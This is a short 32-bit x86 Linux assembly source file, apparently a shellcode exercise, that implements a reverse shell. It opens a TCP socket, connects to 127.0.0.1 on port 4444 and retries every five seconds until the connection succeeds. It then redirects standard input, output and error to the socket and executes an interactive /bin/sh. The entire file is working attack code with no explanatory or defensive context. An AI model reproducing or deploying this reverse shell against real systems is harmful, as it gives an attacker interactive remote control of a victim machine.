BITS 32

section .text
        global _start

section .data
        tv_sec  dq 5
        ;tv_nsec dq 200000000
	bin db "/bin/sh",0
	arg db "-i",0
	args dd bin,arg,0

_start:
	push 	0x0		; IP_PROTO
	push 	0x1		; SOCK_STREAM
	push 	0x2		; AF_INET

	mov 	eax, 102 	; socketcall
	mov 	ebx, 1		; SYS_SOCKET
	mov 	ecx, esp
	int 	80h

	mov 	ebp, eax 	; copy the socket file descriptor into ebp

	;push	0x00000000	; bind ip
	push 	0x0100007f
	push 	0x5c110002	; bind port
	mov 	ecx, esp
	push 	0x10		; ip addr len
	push 	ecx
	push 	ebp
	jmp	_connect

_retry:
	mov     eax, 162        ; nanosleep
        mov     ebx, tv_sec
        int     80h
	jmp	_connect

_connect:
	mov	eax, 102 	; socketcall
	mov	ebx, 3		; SYS_CONNECT
	mov	ecx, esp
	int	80h

	cmp	eax, 0		; retry if refused
	jne	_retry

	mov	ebx, ebp	; copy sockfd into ebx for dup2
	mov	ecx, 2 		; set dup2 counter

_dup_loop:
	mov	eax, 63		; dup2(sockfd, 2-0);
	int	80h
	dec	ecx
	jns	_dup_loop	; jump if not sign

	mov	eax, 11 	; execve ("/bin/sh", ["/bin/sh", "-i"], NULL)
	;push	0x0
	push	0x0068732f	; /sh
	push	0x6e69622f	; /bin/
	mov	ebx, esp
	mov	ecx, args	; ["/bin/sh", "-i"]
	mov	edx, 0		; NULL
	int	80h
